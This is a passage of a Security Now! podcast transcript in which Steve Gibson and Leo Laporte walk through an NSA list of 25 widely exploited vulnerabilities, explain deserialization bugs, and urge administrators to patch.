And note that the idea of providing a whitelist of IPs which can log into a WordPress site, for example, is a perfect instance.  You're trying to protect your login page, which doesn't offer any stronger protection options.  The fact is that, for example, users like me who have cable modems, my IP basically never changes.  I mean, if the power is out for a day, then yes, when I come back on, that IP that I was using will have been grabbed by somebody else, and so I'll get a new one.  But I'll go years with the same IP, making it entirely feasible to simply have the incoming connection IP checked against a short list, like there were two, my IP here, and my IP in my other work location.  If neither IP matched, the page is unavailable.  It just comes up 404.  Sorry, nothing here.  But in either of my locations, I bring up the page normally.



I mean, so there's an instance of an Internet-exposed, fundamentally inherently vulnerable page which just a little bit of attention can completely lock down so that nobody anywhere else, with any other of the 4.3 billion IPv4 addresses or any IPv6s, for that matter, are able to get to it.  It just makes sense.



Okay.  So remember that it was recently necessary for the U.S. Department of Homeland Security to demand that all government agencies immediately update their Windows deployments to remove the Zerologon vulnerability, giving them a deadline.  And also with predictable consequence, even after that, some still had not.  So it just is the case that these things are not being fixed.



Anyway, in light of this list that the NSA published, I thought it would be interesting for us to take sort of a stroll through a single coherent summary of what the NSA is currently actively seeing exploited online.  And without stepping on the lead, I'll note that some of these 25 are surprisingly obscure.  They don't tend to make big waves or headlines in every case, but they are nevertheless powerful network vulnerabilities.  And it's interesting that some of these more obscure vulnerabilities are due to errors in deserialization.  I ran across that word a number of times.  And I thought, okay.  We've talked about this before, but not for a while.  It's most often seen with Java.



The idea is that an object, like a Java object, has a schema, which is a structured layout of data.  Typically when it's in use it's occupying RAM.  The structure's definition often grows over time as all sorts of optional things that weren't considered in the beginning are hung onto it.  So they tend to be less often used.  But the scheme has to have room for all of that.  That means that any particular instance is often only sparsely filled in.  So in order to store it efficiently, when it's time to save it, like onto mass storage, or maybe transmit it over a communications channel, the object goes through a process known as "serialization."  And that's not as in assigning it a serial number, but as in converting it from parallel to serial, or sequential data.



But the trouble arises at the receiving or the deserializing end, when software wishes to restore the received or the stored data back into its parallel or usable form.  The same programmers who wrote the serializer typically also write the deserializer; right?  I mean, that's just like the way the project's going to go.  They wrote the serializer, or they wrote a spec, then they wrote the serializer, then they wrote the deserializer, both to the same spec.  So they naturally assume that the data their deserializer is deserializing was properly serialized by their own serializer.



The trouble arises when that's not the case.  And what is the inherent nature of any deserializer?  It's an interpreter.  And one of this podcast's fundamental precepts is that interpreters are surprising difficult to make bulletproof.  They're one of secure software's greatest challenges and banes.



So what are remote threat actors actively scanning for and exploiting wherever possible?  Number one, Pulse Secure VPN servers.  That's got a CVE number.  I'm not going to go over all the CVE numbers because they're like star dates.  CVE-2019-11510.  Okay, fine.  Pulse Secure VPN servers, an unauthenticated remote attacker can send a specially crafted URI - there's that term we talked about last week, Leo - to perform an arbitrary file read vulnerability.  This may lead to the exposure of keywords or keys or passwords.



So in other words, on unpatched Pulse VPN servers, I mean, they're not actually vulnerable now except they're vulnerable on the 'Net because people didn't patch them.  You can just ask for keys and passwords using a specially crafted URI on those vulnerable servers.  Whoops.  Again, we know how to fix it.  People haven't.



On F5 BIG-IP proxies and load balancers, the Traffic Management User Interface, also referred to as a configuration utility, is vulnerable to a remote code execution that can allow remote attackers to take over the entire BIG-IP device.  Again, we talked about this when it happened.  Yes, it's no longer in the news, but bad guys have added that to their permanent bag of top 25 tricks.



We also have Citrix Application Delivery Controllers and Gateway systems which are vulnerable to a directory traversal bug which could lead to remote code execution without the attacker having to possess valid credentials for the device.  And there are two issues that could be chained to take over Citrix systems.



Then there's a different set of Citrix Application Delivery Controller and Gateway bugs which also impact their SDWAN WAN-OP systems.  In this case, three bugs allow unauthenticated access to certain URL endpoints and information disclosure to low-privileged users.  So it doesn't seem like that bad a problem, but we've already seen how these things can be chained together in order to create a much bigger problem.  And yes, we also have this one, CVE-2019-0708.  Those are numbers I used a lot last year.  That was the BlueKeep vulnerability.  A remote code execution vulnerability exists within Remote Desktop Services on Windows OSes.  And of course remember that Microsoft used the euphemism "authentication bypass."  Yeah, I would say that is an authentication bypass.  That's been a huge headache for admins.  And anybody who hasn't patched is still vulnerable.



LEO:  I don't think that was an NSA vulnerability.  I was confusing that with EternalBlue.



STEVE:  Correct.  Right, right, right.  I think you're right, Leo.  Number eight, a remote code execution vulnerability in the MobileIron Mobile Device Management, that's MDM software that allows remote attackers to execute arbitrary code and take over remote company servers.  Whoops.  Now, there's an example.  Okay.  MobileIron Mobile Device Management.  That one slipped under our radar.  We didn't talk about it.  Didn't make big headlines.  It's not splashy.  But if somebody was using it, hadn't updated, again, arbitrary remote code and remote takeover of company servers who are using that.  Again, these things need to be able to patch themselves.



We also have SIGRed.  A remote execution vulnerability exists in the Windows domain system, the DNS servers, when they fail to properly handle requests.  We talked about that earlier this year.  There's Netlogon, an elevation of privilege vulnerability when an attacker establishes a vulnerable Netlogon secure channel connection to a domain controller using the Netlogon Remote Protocol.  We've been talking about that recently, also.



There's a tampering vulnerability in Microsoft Windows when a man-in-the-middle attacker is able to successfully bypass the NTLM, that's of course the NT LAN Manager, MIC, the Message Integrity Check protection.  Not good when that happens.  We have sending a handcrafted message to an Exim mail transfer agent.  We talked about that not too long ago.  But that causes a buffer overflow, and that's been there, Exim's had this problem since 2018.  And still, again, if it's not causing you problems, you don't think about it.  But it's just sitting there allowing the remote code execution and the takeover of servers running that MTA, that Mail Transfer Agent.



There's a remote code execution vulnerability in Microsoft Exchange software when it fails to properly handle objects in memory.  We've got some Adobe Cold Fusion versions having an exploitable, and here's the first one of many, deserialization of untrusted data vulnerability.



LEO:  It's such an interesting vulnerability, the serialization/deserialization.  I love that, actually.



STEVE:  Yeah, it's exactly right, Leo, it's very cool from a sort of a theoretical standpoint.



LEO:  Right.  It's kind of related to not sanitizing your inputs.  You know, you just assume, well, this was serialized properly, so I'm just going to treat it as if it was, and boom.



STEVE:  Exactly.  Exactly.  And of course it also can allow arbitrary code execution.  There's the WLS Security component in Oracle WebLogic Server.  That's what WLS stands for, WebLogic Server 15, which allows remote attackers to execute arbitrary commands via a crafted serialized Java object.  So although they didn't say deserialization, that's the same problem there.  And a vulnerability exists in the Oracle Coherence product of Oracle Fusion Middleware.  They said this easily exploitable vulnerability allows unauthenticated attackers with network access via T3 to compromise Oracle Coherence systems.  So a little special case.  But the bad guys are scanning for these problems; and they'll find them, if you haven't patched them.



We've got the Widget Connector macro in Atlassian Confluence 17 Server, which allows remote attackers to achieve path traversal and remote code execution on a Confluence Server or Data Center instance via server-side template injection.  And that's a 2019 CVE, so it's been around for a while, too.  Another 2019er is attackers who can send requests to an Atlassian Crowd or Crowd Data Center instance can exploit this vulnerability to install arbitrary plugins, which permits remote code execution.  Again, not Atlassian's fault, by any means.  They fixed this a year ago.  But unless people are staying current with updates, you're going to remain vulnerable.



So, I mean, it's like this last mile problem.  We just have to fix this.  Zoho Manage Engine Desktop Central allows remote code execution because of - wait for it - deserialization of untrusted data.  Last year:  Progress Telerik UI for ASP.NET AJAX contains a .NET deserialization vulnerability.  Exploitation can result in remote code execution.  And we've got CurveBall, which was a name we enjoyed talking about earlier this year.  That's a spoofing vulnerability which exists in the way Windows CryptoAPI, that's the Crypt32.dll, validates Elliptic Curve Crypto - that's ECC - certificates.  An attack could exploit the vulnerability by using a spoofed code signing cert to sign a malicious executable, making it appear that the file was from a trusted, legitimate source.



So that's not a huge problem.  But again, if they detect that you have somehow not fixed this, it makes it very easy to slip something past AV, which is checking the signature on certs.  If it's checking it against a defective CryptoAPI, it won't see that it was not actually from a trusted source.  From last year, an elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle objects in memory.



Now, remember around the middle of last year there was that whole spate of Win32k things?  Well, that was thanks to SandboxEscaper, who was going through her tough time and was upset at the world and releasing zero-days right and left.  Anyway, those have stopped because Microsoft in their infinite wisdom hired her.  Good.  Thank you.  But apparently it's still out there floating around in the ether.  There are still systems vulnerable among the top 25.  Twenty-three is, as I mentioned earlier, from 2017, a problem in the Symantec Messaging Gateway.  They fixed it three years ago, but it's still out there on the 'Net giving some people some pain.



There's a vulnerability in the Cisco Discovery Protocol implementation for Cisco IOS XR software, which could allow an unauthenticated adjacent attacker to execute arbitrary code or cause a reload of an affected device.  So that sounds like something, since it's adjacent, you need to somehow be close to it in the network in order to take advantage of that, since it's using the Cisco Discovery Protocol.  And finally, DrayTek Vigor devices allow remote code execution as root, without authentication, via shell metacharacters.  And again, that didn't make anybody's headline anywhere.  But apparently, whatever DrayTek Vigor devices are...



LEO:  Sounds like a vampire or something.  I am DrayTek Vigor.  I have come to suck your blood.  I think it's "vigor."  But anyway, it must be some sort of, yeah, some sort of device.



STEVE:  Yeah.  So that's the list.  Even a three-year-old vulnerability like that flaw in that Symantec messaging gateway remains on the hit list of well-financed state-level attackers.  And you know, Leo, as I was looking through this, thinking about the NSA, here in the U.S. we have a naturally U.S.-centric viewpoint.  So we don't see stories about the NSA or the CIA hackers doing the same thing to China, Russia, Iran, or North Korea.  And I really wish that none of this was happening on either side because it just seems so destructive and wrong.  But from a patriotic standpoint, I cannot help hoping that we're giving as good as we're getting because we certainly do appear to be getting a lot.



Once upon a time, you know, the ongoing level of network intrusions was mostly off the radar.  It was embarrassing for any company to admit when they discovered that their own network security perimeter had been breached.  So whenever possible, it would be kept strictly on the down-low and dealt with as quietly as they could.  Maybe they'd have to disclose it in an annual notice to their stockholders if they were publicly traded.  But certainly, if they were not a public company, no, they would just like fix it and, shhh, let's not, you know, we'll just hope nobody notices.



But today, as we detailed last week with Ryuk, however you pronounce it, we have ransomware which proactively makes any such network intrusion embarrassingly public and impossible to hide.  And look, it's happening everywhere.  So the only sane appraisal would be that non-ransomware attacks are also happening everywhere.  They're just continuing to go unreported, like once upon a time in the old days, before ransomware was outing all of the companies that were being attacked.  We have to assume that I would say an equal measure as we're seeing publicly disclosed thanks to ransomware not giving people a choice are still happening.



So, I mean, unfortunately, our networks are sieves.  I mean, just like, as I've said, I've talked about security being a sponge.  The harder you press, the more gets through.  It's a mess.  And here's a list of 25 things, all which have been fixed, in some cases for three years.



LEO:  Now, do they say these are the most prevalent attacks?  Or just here's an assortment of 25 attacks?



STEVE:  Yeah, it was...



LEO:  These are the most common?



STEVE:  Yes.  The most common that they are seeing.



LEO:  Because I get attacked all the time.



STEVE:  And the most easily remediated.  I mean, just update.



LEO:  Right.  Yeah, I get attacked frequently because now with my Ubiquiti I can see the alerts to all the various blocked attacks.  And it's all over the place, all kinds of ports.  They're probing all the time.



STEVE:  Well, and remember I coined the term years ago, IBR, Internet Background Radiation.



LEO:  It's only gotten worse.



STEVE:  Yeah, I mean, there's still Code Red out there scanning for Windows NT, hoping to get lucky.



LEO:  I think a lot of people, script kiddies especially, are just using scanners, or Shodan-type searches, just looking, you know, I know there's a vulnerability.  I'll just scan millions of IP addresses a second and find which one has it.  Because I get scanned hundreds of times a day, easily, for stuff.



Hey, I thought I'd share this with you before we wrap it up.  This is from Harry McCracken's Twitter feed.  And it made me think of you.  This was 20 years ago during the 2000 election, the mobile edition of Gore 2000 for your Palm Pilot.  Remember the program AvantGo?  If you use AvantGo's software, you can download - and they suggest you sync at least twice a week to get the latest information on the election on your Palm Pilot.  I thought about you when I saw that.  We've come a long way.



STEVE:  I have one of those.



LEO:  You have several, as I remember.



STEVE:  Uh-huh.



LEO:  That's Steve Gibson, everybody.  He is the man of the hour, the day, the week, the year, the last 790 episodes of Security Now!.  If you want to keep up on what's going on in security, this is the place to be every Tuesday, right about 1:30 Pacific, 4:30 Eastern.  Normally it has been 20:30 during our summertime, but we are going to, this coming Sunday, shift back to standard time, which means our time will no longer, what did I say, 21:00 UTC.  It'll be 20:00 UTC.  So we're falling back.  So just a little word of warning.  You may have already changed, a lot of Europe changed to standard time this past weekend.  But ours comes on the day after Halloween this year.  So just make a note of that, if you like to watch live.



The live streams are at TWiT.tv/live.  Audio and video is there.  Chat in the chatroom if you're watching live.  They're live, too, most of them, irc.twit.tv.  You can also get on-demand versions of the show from Steve's site, GRC.com.  He has 16Kb audio for the bandwidth-impaired, 64Kb audio.  He's also the only place you can get hand-coded, human-written transcripts of the entire show, so if you like to read along.  It also makes it easy to search because you can search those transcripts and  find the part of the show you're most interested in.  That's GRC.com.



While you're there, pick up a copy of SpinRite, the world's best hard drive recovery and maintenance utility, version 6 current, 6.1 on its way.  You can participate in that and get a free upgrade if you buy right now at GRC.com.  There's lots of free stuff there, too, including ShieldsUP! and his Perfect Paper Passwords, all the information about SQRL.  His new forums, they're up and running.  Is that forums.grc.com?



STEVE:  Yes, yes.



LEO:  Okay, good.  You can leave a question there for him, GRC.com/feedback.  But he's also on Twitter.  I always put up your Twitter handle because he accepts DMs from anybody:  @SGgrc.  If you've got a tip or you just want to converse with the great Steve Gibson:  @SGgrc.  We have all the shows at our site, TWiT.tv/sn.  There's a YouTube channel.  Honestly, the best thing you could do, pick up a copy of Pocket Casts or Overcast or Shoutcast or whatever cast, all the podcast applications, and subscribe.  That way you'll get it automatically, the minute it's available of a Tuesday evening.  I think we're done here, Steve.  Thank you so much.



STEVE:  And Leo, we will be back together on the U.S. Presidential Election Day.



LEO:  Now, did you early vote?  Or are you going to be voting on Tuesday?



STEVE:  Oh, months ago.



LEO:  Yeah.  Me, too.  I voted the minute I got...



STEVE:  Vote early.  Vote often.



LEO:  So we won't take the day off on Tuesday.  But folks, if you're listening, and you want to take the day off so you can vote, Steve and I give you permission.  In fact, we encourage you.  We encourage you to do that because we're going to be here no matter what.  Thanks, Steve.  We'll have a great time next Tuesday.  We'll see you then.



STEVE:  Thanks, buddy.  Bye.



Copyright (c) 2020 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




